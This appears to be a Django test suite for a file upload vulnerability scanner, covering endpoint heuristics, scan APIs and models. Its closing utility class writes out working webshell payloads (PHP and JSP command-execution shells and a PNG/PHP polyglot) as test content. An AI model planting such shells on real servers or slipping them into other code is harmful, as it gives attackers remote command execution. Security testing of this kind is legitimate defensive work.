from django.test import TestCase, TransactionTestCase
from django.contrib.auth.models import User
from django.urls import reverse
from rest_framework.test import APITestCase, APIClient
from rest_framework import status
from unittest.mock import patch, MagicMock
import json
from .models import FileUploadScanResult, FileUploadTest, ScanSession
from .services import FileUploadVulnerabilityScanner

class FileUploadScannerServiceTest(TestCase):
    """Test the FileUploadVulnerabilityScanner service"""
    
    def setUp(self):
        self.user = User.objects.create_user('testuser', 'test@test.com', 'testpass')
        self.scan_id = 1
        self.scanner = FileUploadVulnerabilityScanner(self.scan_id, self.user)
    
    def test_prepare_test_files(self):
        """Test that test files are properly prepared"""
        test_files = self.scanner._prepare_test_files()
        
        self.assertIn('webshell_php', test_files)
        self.assertIn('large_file', test_files)
        self.assertIn('executable', test_files)
        
        # Check PHP webshell
        php_shell = test_files['webshell_php']
        self.assertEqual(php_shell['name'], 'shell.php')
        self.assertIn('<?php', php_shell['content'])
        self.assertEqual(php_shell['type'], 'webshell')
    
    def test_might_accept_file_uploads_heuristics(self):
        """Test the heuristics for detecting file upload endpoints"""
        # Test positive cases
        upload_api = {
            'method': 'POST',
            'url': 'http://example.com/api/upload',
            'headers': '{}',
        }
        self.assertTrue(self.scanner._might_accept_file_uploads(upload_api))
        
        # Test negative cases
        get_api = {
            'method': 'GET',
            'url': 'http://example.com/api/users',
            'headers': '{}',
        }
        self.assertFalse(self.scanner._might_accept_file_uploads(get_api))
        
        # Test multipart content type
        multipart_api = {
            'method': 'POST',
            'url': 'http://example.com/api/submit',
            'headers': '{"Content-Type": "multipart/form-data"}',
        }
        self.assertTrue(self.scanner._might_accept_file_uploads(multipart_api))
    
    @patch('api_4.services.connection')
    def test_get_apis_for_scan(self, mock_connection):
        """Test fetching APIs from database"""
        mock_cursor = MagicMock()
        mock_connection.cursor.return_value.__enter__.return_value = mock_cursor
        
        # Mock database response
        mock_cursor.description = [
            ('id',), ('name',), ('method',), ('url',), 
            ('headers',), ('body',), ('authorization',), ('query_params',)
        ]
        mock_cursor.fetchall.return_value = [
            (1, 'TestAPI', 'POST', 'http://test.com/upload', '{}', '{}', '{}', '{}')
        ]
        
        apis = self.scanner.get_apis_for_scan()
        
        self.assertEqual(len(apis), 1)
        self.assertEqual(apis[0]['name'], 'TestAPI')
        self.assertEqual(apis[0]['method'], 'POST')
    
    @patch('api_4.services.connection')
    def test_get_jwt_token(self, mock_connection):
        """Test JWT token retrieval"""
        mock_cursor = MagicMock()
        mock_connection.cursor.return_value.__enter__.return_value = mock_cursor
        
        mock_cursor.fetchone.return_value = ('test-jwt-token',)
        
        token = self.scanner.get_jwt_token()
        
        self.assertEqual(token, 'test-jwt-token')
        mock_cursor.execute.assert_called_once()


class FileUploadScanAPITest(APITestCase):
    """Test the API endpoints"""
    
    def setUp(self):
        self.user = User.objects.create_user('testuser', 'test@test.com', 'testpass')
        self.client = APIClient()
        self.client.force_authenticate(user=self.user)
    
    def test_start_scan_endpoint(self):
        """Test starting a scan via API"""
        url = reverse('api_4:start_scan')
        data = {'scan_id': 1}
        
        with patch('api_4.views.FileUploadVulnerabilityScanner') as mock_scanner:
            response = self.client.post(url, data, format='json')
        
        self.assertEqual(response.status_code, status.HTTP_202_ACCEPTED)
        self.assertIn('scan_id', response.data)
        self.assertEqual(response.data['scan_id'], 1)
    
    def test_start_scan_missing_scan_id(self):
        """Test starting scan without scan_id"""
        url = reverse('api_4:start_scan')
        data = {}
        
        response = self.client.post(url, data, format='json')
        
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn('error', response.data)
    
    def test_get_scan_results(self):
        """Test retrieving scan results"""
        # Create test data
        scan_result = FileUploadScanResult.objects.create(
            scan_id=1,
            api_id=1,
            api_name='TestAPI',
            api_url='http://test.com',
            api_method='POST',
            status='vulnerable',
            vulnerability_type='webshell'
        )
        
        url = reverse('api_4:scan_results')
        response = self.client.get(url, {'scan_id': 1})
        
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertIn('results', response.data)
        self.assertEqual(len(response.data['results']), 1)
    
    def test_get_vulnerable_apis(self):
        """Test retrieving only vulnerable APIs"""
        # Create test data
        FileUploadScanResult.objects.create(
            scan_id=1, api_id=1, api_name='VulnAPI', api_url='http://test.com',
            api_method='POST', status='vulnerable'
        )
        FileUploadScanResult.objects.create(
            scan_id=1, api_id=2, api_name='SafeAPI', api_url='http://test.com',
            api_method='POST', status='safe'
        )
        
        url = reverse('api_4:vulnerable_apis')
        response = self.client.get(url, {'scan_id': 1})
        
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(len(response.data['vulnerable_apis']), 1)
        self.assertEqual(response.data['vulnerable_apis'][0]['api_name'], 'VulnAPI')
    
    def test_get_scan_stats(self):
        """Test retrieving scan statistics"""
        # Create test session and results
        session = ScanSession.objects.create(
            scan_id=1, user=self.user, total_apis=5, completed_apis=5, 
            vulnerable_apis=2, status='completed'
        )
        
        FileUploadScanResult.objects.create(
            scan_id=1, api_id=1, api_name='VulnAPI1', api_url='http://test.com',
            api_method='POST', status='vulnerable', vulnerability_type='webshell'
        )
        FileUploadScanResult.objects.create(
            scan_id=1, api_id=2, api_name='VulnAPI2', api_url='http://test.com',
            api_method='POST', status='vulnerable', vulnerability_type='large_file'
        )
        FileUploadScanResult.objects.create(
            scan_id=1, api_id=3, api_name='SafeAPI', api_url='http://test.com',
            api_method='POST', status='safe'
        )
        
        url = reverse('api_4:scan_stats')
        response = self.client.get(url, {'scan_id': 1})
        
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        # Check scan info
        self.assertEqual(response.data['scan_info']['scan_id'], 1)
        self.assertEqual(response.data['scan_info']['status'], 'completed')
        self.assertEqual(response.data['scan_info']['total_apis'], 5)
        
        # Check vulnerability summary
        self.assertEqual(response.data['vulnerability_summary']['total_tested'], 3)
        self.assertEqual(response.data['vulnerability_summary']['vulnerable'], 2)
        self.assertEqual(response.data['vulnerability_summary']['safe'], 1)
        
        # Check vulnerability types
        self.assertEqual(response.data['vulnerability_types']['webshell_upload'], 1)
        self.assertEqual(response.data['vulnerability_types']['large_file_upload'], 1)


class ModelTest(TestCase):
    """Test the models"""
    
    def setUp(self):
        self.user = User.objects.create_user('testuser', 'test@test.com', 'testpass')
    
    def test_scan_session_creation(self):
        """Test ScanSession model"""
        session = ScanSession.objects.create(
            scan_id=1,
            user=self.user,
            total_apis=10,
            status='running'
        )
        
        self.assertEqual(str(session), 'Scan Session 1 - running')
        self.assertEqual(session.completed_apis, 0)
        self.assertEqual(session.vulnerable_apis, 0)
    
    def test_file_upload_scan_result_creation(self):
        """Test FileUploadScanResult model"""
        result = FileUploadScanResult.objects.create(
            scan_id=1,
            api_id=1,
            api_name='TestAPI',
            api_url='http://test.com/upload',
            api_method='POST',
            status='vulnerable',
            vulnerability_type='webshell',
            webshell_upload_success=True
        )
        
        self.assertEqual(str(result), 'Scan 1 - API TestAPI - vulnerable')
        self.assertTrue(result.webshell_upload_success)
        self.assertFalse(result.large_file_upload_success)
    
    def test_file_upload_test_creation(self):
        """Test FileUploadTest model"""
        scan_result = FileUploadScanResult.objects.create(
            scan_id=1, api_id=1, api_name='TestAPI', 
            api_url='http://test.com', api_method='POST'
        )
        
        test = FileUploadTest.objects.create(
            scan_result=scan_result,
            file_name='shell.php',
            file_type='webshell',
            file_size=1024,
            test_type='webshell',
            upload_success=True,
            response_status=200
        )
        
        self.assertEqual(test.file_name, 'shell.php')
        self.assertTrue(test.upload_success)
        self.assertEqual(test.response_status, 200)


class IntegrationTest(TransactionTestCase):
    """Integration tests that test the full workflow"""
    
    def setUp(self):
        self.user = User.objects.create_user('testuser', 'test@test.com', 'testpass')
        self.scan_id = 1
    
    @patch('api_4.services.FileUploadVulnerabilityScanner.get_apis_for_scan')
    @patch('api_4.services.FileUploadVulnerabilityScanner.get_jwt_token')
    @patch('api_4.services.requests.Session.request')
    def test_full_scan_workflow(self, mock_request, mock_jwt, mock_apis):
        """Test complete scan workflow"""
        # Mock data
        mock_apis.return_value = [{
            'id': 1,
            'name': 'UploadAPI',
            'method': 'POST',
            'url': 'http://test.com/upload',
            'headers': '{"Content-Type": "multipart/form-data"}',
            'body': '{}',
            'authorization': '{}',
            'query_params': '{}'
        }]
        mock_jwt.return_value = 'test-token'
        
        # Mock successful upload response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.headers = {'Content-Type': 'application/json'}
        mock_response.text = '{"message": "File uploaded successfully"}'
        mock_request.return_value = mock_response
        
        # Run scan
        scanner = FileUploadVulnerabilityScanner(self.scan_id, self.user)
        scanner.start_scan()
        
        # Verify results
        session = ScanSession.objects.get(scan_id=self.scan_id)
        self.assertEqual(session.status, 'completed')
        self.assertEqual(session.total_apis, 1)
        self.assertEqual(session.completed_apis, 1)
        
        results = FileUploadScanResult.objects.filter(scan_id=self.scan_id)
        self.assertEqual(results.count(), 1)
        
        result = results.first()
        self.assertEqual(result.api_name, 'UploadAPI')
        self.assertTrue(result.accepts_file_upload)


# Test utilities
class FileUploadTestUtils:
    """Utility functions for testing file upload vulnerabilities"""
    
    @staticmethod
    def create_test_webshell(language='php'):
        """Create test webshell content"""
        shells = {
            'php': '<?php system($_GET["cmd"]); ?>',
            'jsp': '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'aspx': '<%@ Page Language="C#" %><% Response.Write(Request["cmd"]); %>'
        }
        return shells.get(language, shells['php'])
    
    @staticmethod
    def create_large_file_content(size_mb=1):
        """Create large file content for testing"""
        return b'A' * (size_mb * 1024 * 1024)
    
    @staticmethod
    def create_polyglot_file():
        """Create polyglot file (image + script)"""
        # PNG header + PHP
        return b'\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>'